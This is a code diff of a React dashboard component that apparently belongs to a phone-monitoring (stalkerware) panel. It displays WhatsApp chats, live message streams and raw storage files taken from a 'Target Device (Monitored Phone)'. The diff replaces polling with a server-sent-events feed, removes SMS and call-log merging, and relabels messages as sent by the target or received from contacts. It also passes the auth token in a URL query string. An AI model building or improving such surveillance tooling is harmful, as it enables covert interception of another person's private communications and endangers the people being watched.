@@ -1,7 +1,8 @@
 import { useEffect, useMemo, useRef, useState } from "react";
+import { apiClient } from "../api/client";
 import { devicesApi } from "../api/devices";
 import { downloadFileViaRelay } from "../api/fileDownload";
-import type { CallLogEntry, SmsLogEntry, WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
+import type { WhatsAppChatSummary, WhatsAppMessage } from "../api/types";
 
 // ============================================================================
 // TYPES & DATA MODELS
@@ -85,8 +86,6 @@ export interface UnifiedChatMessage {
   mediaType?: string | null;
   mediaPath?: string | null;
 }
-
-const AUTO_REFRESH_INTERVAL_MS = 4000; // Live update interval (real-time chat updates)
 
 // ============================================================================
 // HELPER FUNCTIONS
@@ -243,6 +242,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [chatSearch, setChatSearch] = useState("");
   const [messagesLoading, setMessagesLoading] = useState(false);
   const [activeThreadMessages, setActiveThreadMessages] = useState<UnifiedChatMessage[]>([]);
+  const fetchCurrentChatRef = useRef<((isInitial: boolean) => void) | null>(null);
 
   // WhatsApp Storage Files State
   const [files, setFiles] = useState<FileEntryDtoLocal[] | null>(null);
@@ -253,19 +253,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
   const [downloadingFile, setDownloadingFile] = useState<string | null>(null);
 
   // --------------------------------------------------------------------------
-  // 1. DATA LOADER (REAL DATA FROM DEVICE)
+  // 1. DATA LOADER (STRICTLY WHATSAPP ONLY - NO SMS / CALL LOGS)
   // --------------------------------------------------------------------------
   const loadDeviceChatData = async () => {
     setLoading(true);
     try {
-      const [waData, callData, smsData] = await Promise.all([
-        devicesApi.whatsAppChats(deviceId).catch((err) => {
-          console.warn("WhatsApp chats fetch error:", err);
-          return [] as WhatsAppChatSummary[];
-        }),
-        devicesApi.callLog(deviceId).catch(() => [] as CallLogEntry[]),
-        devicesApi.smsLog(deviceId).catch(() => [] as SmsLogEntry[]),
-      ]);
+      const waData = await devicesApi.whatsAppChats(deviceId).catch((err) => {
+        console.warn("WhatsApp chats fetch error:", err);
+        return [] as WhatsAppChatSummary[];
+      });
 
       // Filter out storage pseudo-buckets
       const realWaChats = (waData || []).filter(
@@ -275,31 +271,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           )
       );
 
-      const existingNames = new Set(realWaChats.map((c) => c.chat_name.toLowerCase().trim()));
-      const combined = [...realWaChats];
-
-      // Merge all known contacts on the device into the WhatsApp chatlist
-      const contactSources = [
-        ...callData.map((c) => ({ name: c.contact_name || c.counterparty, time: c.called_at })),
-        ...smsData.map((s) => ({ name: s.contact_name || s.counterparty, time: s.message_at })),
-      ];
-
-      for (const cs of contactSources) {
-        if (!cs.name) continue;
-        const key = cs.name.toLowerCase().trim();
-        if (!existingNames.has(key)) {
-          existingNames.add(key);
-          combined.push({
-            chat_name: cs.name,
-            total_messages: 1,
-            last_message_at: cs.time || new Date().toISOString(),
-            last_message: "WhatsApp Contact",
-            last_is_outgoing: false,
-          });
-        }
-      }
-
-      setWhatsappChats(combined);
+      setWhatsappChats(realWaChats);
       setLastSyncedTime(new Date());
     } catch (e) {
       console.error("Failed to load device chat data", e);
@@ -308,16 +280,44 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
     }
   };
 
-  // Mount + Live Auto-Refresh polling (every 15s)
   const loadRef = useRef(loadDeviceChatData);
   loadRef.current = loadDeviceChatData;
 
+  // Real-time EventSource listener: Updates instantly on incoming/outgoing messages
+  // No annoying auto-refresh polling interval!
   useEffect(() => {
     loadRef.current();
-    const interval = setInterval(() => {
-      loadRef.current();
-    }, AUTO_REFRESH_INTERVAL_MS);
-    return () => clearInterval(interval);
+
+    let eventSource: EventSource | null = null;
+    try {
+      const token = localStorage.getItem("spapp_token") || "";
+      const baseApi = apiClient.defaults.baseURL || "http://localhost:4000";
+      const sseUrl = `${baseApi}/api/devices/${deviceId}/events?token=${encodeURIComponent(token)}`;
+      eventSource = new EventSource(sseUrl);
+
+      eventSource.onmessage = (event) => {
+        try {
+          const payload = JSON.parse(event.data);
+          if (payload.type === "whatsapp_message") {
+            setLastSyncedTime(new Date());
+            // Instantly refresh WhatsApp chatlist when a message arrives
+            loadRef.current();
+            // If the user is currently viewing the active conversation, refresh messages live
+            if (fetchCurrentChatRef.current) {
+              fetchCurrentChatRef.current(false);
+            }
+          }
+        } catch (_) {}
+      };
+    } catch (err) {
+      console.warn("Real-time SSE subscription error:", err);
+    }
+
+    return () => {
+      if (eventSource) {
+        eventSource.close();
+      }
+    };
   }, [deviceId]);
 
   // Formatted WhatsApp Chat Summaries
@@ -414,9 +414,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           const effective = filtered.length > 0 ? filtered : list;
           const unified: UnifiedChatMessage[] = effective.map((m) => ({
             id: m.id,
-            sender: m.is_outgoing ? "Me" : m.sender || currentChat.chatName,
+            sender: m.is_outgoing ? "Target Device" : m.sender || currentChat.chatName,
             text: m.message_text,
-            isOutgoing: m.is_outgoing,
+            isOutgoing: Boolean(m.is_outgoing),
             timestamp: m.message_time,
             mediaType: m.media_type,
             mediaPath: m.media_path,
@@ -430,9 +430,9 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
           ) {
             unified.push({
               id: `preview-${currentChat.id}`,
-              sender: currentChat.lastIsOutgoing ? "Me" : currentChat.chatName,
+              sender: currentChat.lastIsOutgoing ? "Target Device" : currentChat.chatName,
               text: currentChat.lastMessage,
-              isOutgoing: currentChat.lastIsOutgoing,
+              isOutgoing: Boolean(currentChat.lastIsOutgoing),
               timestamp: currentChat.lastMessageAt || new Date().toISOString(),
             });
           }
@@ -448,16 +448,12 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         });
     };
 
+    fetchCurrentChatRef.current = fetchChatMessages;
     fetchChatMessages(true);
-
-    // Silent background live polling every 4 seconds so chats update in real time
-    const liveInterval = setInterval(() => {
-      fetchChatMessages(false);
-    }, 4000);
 
     return () => {
       isMounted = false;
-      clearInterval(liveInterval);
+      fetchCurrentChatRef.current = null;
     };
   }, [selectedChatId, whatsappChatSummaries, deviceId, timeFilter, dashboardLoginTime]);
 
@@ -681,11 +677,11 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
       {/* ===================================================================== */}
       {/* THREE-COLUMN WORKSPACE: APPS RAIL | CHATLIST | CHAT CONVERSATION      */}
       {/* ===================================================================== */}
-      <div className="grid grid-cols-1 md:grid-cols-12 h-[680px] overflow-hidden">
+      <div className="flex flex-col md:flex-row h-[720px] overflow-hidden bg-white">
         {/* =================================================================== */}
         {/* COLUMN 1: APPS RAIL (LEFT)                                          */}
         {/* =================================================================== */}
-        <div className="md:col-span-3 lg:col-span-2.5 border-r border-gray-100 bg-gray-50/70 p-3 space-y-3 flex flex-col h-full min-h-0 overflow-hidden">
+        <div className="w-full md:w-56 lg:w-64 shrink-0 border-r border-gray-100 bg-gray-50/70 p-3 space-y-3 flex flex-col h-full min-h-0 overflow-hidden">
           <div className="px-2 pt-1 flex items-center justify-between shrink-0">
             <h3 className="text-[10px] font-bold uppercase tracking-wider text-gray-400">
               Applications
@@ -772,7 +768,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         {/* NON-SUPPORTED APPS (TELEGRAM, INSTAGRAM, MESSENGER)                 */}
         {/* =================================================================== */}
         {!SUPPORTED_APPS.find((a) => a.id === selectedApp)?.isSupported && (
-          <div className="md:col-span-9 lg:col-span-9.5 p-12 flex flex-col items-center justify-center text-center space-y-3 bg-white">
+          <div className="flex-1 min-w-0 p-12 flex flex-col items-center justify-center text-center space-y-3 bg-white">
             <div
               className="w-16 h-16 rounded-2xl flex items-center justify-center shadow-sm"
               style={{
@@ -813,7 +809,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               {/* ----------------------------------------------------------- */}
               {/* COLUMN 2: COMPLETE CHATLIST & CHANNELS FROM MOBILE PHONE    */}
               {/* ----------------------------------------------------------- */}
-              <div className="md:col-span-4 lg:col-span-3.5 border-r border-gray-100 flex flex-col bg-white h-full min-h-0 overflow-hidden">
+              <div className="w-full md:w-80 lg:w-96 shrink-0 border-r border-gray-100 flex flex-col bg-white h-full min-h-0 overflow-hidden">
                 {/* Search Bar */}
                 <div className="p-3 border-b border-gray-100 bg-gray-50/50 space-y-2 shrink-0">
                   <div className="relative">
@@ -966,15 +962,21 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               </p>
                             )}
 
-                            {/* Two-line preview without cutting, with full tooltip */}
+                            {/* Two-line preview with verified Sent vs Recv indicator */}
                             <p
                               className="text-[11px] text-gray-600 line-clamp-2 leading-snug flex items-start gap-1"
                               title={c.lastMessage || ""}
                             >
-                              {c.lastIsOutgoing && (
-                                <span className="text-emerald-600 font-bold text-[11px] shrink-0">✓✓</span>
+                              {c.lastIsOutgoing ? (
+                                <span className="text-emerald-600 font-bold text-[10px] shrink-0" title="Sent by Target">
+                                  ↗ Sent:
+                                </span>
+                              ) : (
+                                <span className="text-sky-600 font-bold text-[10px] shrink-0" title="Received from Contact">
+                                  ↙ Recv:
+                                </span>
                               )}
-                              <span>{c.lastMessage || "(No text)"}</span>
+                              <span className="truncate">{c.lastMessage || "(No text)"}</span>
                             </p>
 
                             <div className="mt-1 flex items-center gap-1.5">
@@ -1002,7 +1004,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               {/* ----------------------------------------------------------- */}
               {/* COLUMN 3: SELECTED CHAT CONVERSATION (LAST 5 DAYS DATA)      */}
               {/* ----------------------------------------------------------- */}
-              <div className="md:col-span-5 lg:col-span-6 flex flex-col bg-slate-100/60 h-full min-h-0 overflow-hidden">
+              <div className="flex-1 min-w-0 flex flex-col bg-slate-100/60 h-full min-h-0 overflow-hidden">
                 {selectedChatSummary ? (
                   <>
                     {/* Conversation Header */}
@@ -1123,43 +1125,45 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                               </span>
                             </div>
 
-                            {/* Chat Speech Bubbles - SENDER vs RECEIVER SIDE */}
+                            {/* Chat Speech Bubbles - SENDER (Target) vs RECEIVER (Contact) */}
                             {group.items.map((m) => {
-                              const isMe = m.isOutgoing || m.sender?.toLowerCase() === "me" || m.sender?.toLowerCase() === "you";
+                              const isTargetSent = m.isOutgoing;
                               return (
                                 <div
                                   key={m.id}
-                                  className={`flex w-full my-2.5 ${isMe ? "justify-end" : "justify-start"}`}
+                                  className={`flex w-full my-2.5 ${isTargetSent ? "justify-end" : "justify-start"}`}
                                 >
                                   <div
                                     className={`max-w-[85%] sm:max-w-[78%] md:max-w-[72%] rounded-2xl px-4 py-2.5 shadow-xs space-y-1 text-xs relative ${
-                                      isMe
+                                      isTargetSent
                                         ? "bg-[#d9fdd3] text-gray-900 rounded-br-xs border border-emerald-300/60"
                                         : "bg-white text-gray-900 rounded-bl-xs border border-gray-200"
                                     }`}
                                   >
-                                    {/* Sender vs Receiver Header Label */}
+                                    {/* Verification Header: Sent by Target vs Received from Contact */}
                                     <div
                                       className={`flex items-center justify-between gap-3 pb-1 border-b text-[10px] ${
-                                        isMe
+                                        isTargetSent
                                           ? "border-emerald-600/10 text-emerald-800"
                                           : "border-gray-100 text-gray-700"
                                       }`}
                                     >
                                       <span className="font-bold flex items-center gap-1 truncate">
-                                        <span>{isMe ? "↗" : "↙"}</span>
-                                        <span>
-                                          {isMe ? "You (Sender)" : `${m.sender || selectedChatSummary.chatName} (Receiver)`}
+                                        <span className="text-sm font-black">{isTargetSent ? "↗" : "↙"}</span>
+                                        <span className="truncate">
+                                          {isTargetSent
+                                            ? "Sent by Target (Monitored Phone)"
+                                            : `Received from: ${m.sender || selectedChatSummary.chatName}`}
                                         </span>
                                       </span>
                                       <span
-                                        className={`text-[9px] font-semibold px-1.5 py-0.2 rounded shrink-0 ${
-                                          isMe
-                                            ? "bg-emerald-100/80 text-emerald-800"
-                                            : "bg-gray-100 text-gray-600"
+                                        className={`text-[9px] font-semibold px-2 py-0.5 rounded-full shrink-0 border ${
+                                          isTargetSent
+                                            ? "bg-emerald-100/90 text-emerald-800 border-emerald-200"
+                                            : "bg-sky-50 text-sky-800 border-sky-200"
                                         }`}
                                       >
-                                        {isMe ? "Sender" : "Receiver"}
+                                        {isTargetSent ? "Sent by Target" : "Received from Contact"}
                                       </span>
                                     </div>
 
@@ -1216,15 +1220,15 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                       {m.text}
                                     </p>
 
-                                    {/* Message Footer: Timestamp & Read Receipt */}
+                                    {/* Message Footer: Timestamp & Delivery Status */}
                                     <div
                                       className={`flex items-center justify-end gap-1.5 text-[10px] pt-1 font-medium ${
-                                        isMe ? "text-emerald-800/80" : "text-gray-400"
+                                        isTargetSent ? "text-emerald-800/80" : "text-gray-400"
                                       }`}
                                     >
                                       <span>{formatMessageTime(m.timestamp)}</span>
-                                      {isMe && (
-                                        <span className="text-[#34b7f1] font-bold text-[11px] tracking-tighter" title="Delivered & Read">
+                                      {isTargetSent && (
+                                        <span className="text-[#34b7f1] font-bold text-[11px] tracking-tighter" title="Sent by Target (Delivered)">
                                           ✓✓
                                         </span>
                                       )}
@@ -1255,7 +1259,7 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
         {/* WHATSAPP RAW STORAGE FILE MANAGER                                   */}
         {/* =================================================================== */}
         {selectedApp === "whatsapp" && activeView === "files" && (
-          <div className="md:col-span-9 lg:col-span-9.5 p-5 space-y-4 bg-white overflow-y-auto h-full min-h-0">
+          <div className="flex-1 min-w-0 p-5 space-y-4 bg-white overflow-y-auto h-full min-h-0">
             <div className="flex flex-wrap items-center justify-between gap-3 bg-gray-50 p-3 rounded-lg border border-gray-100">
               <div className="flex items-center gap-2">
                 <button
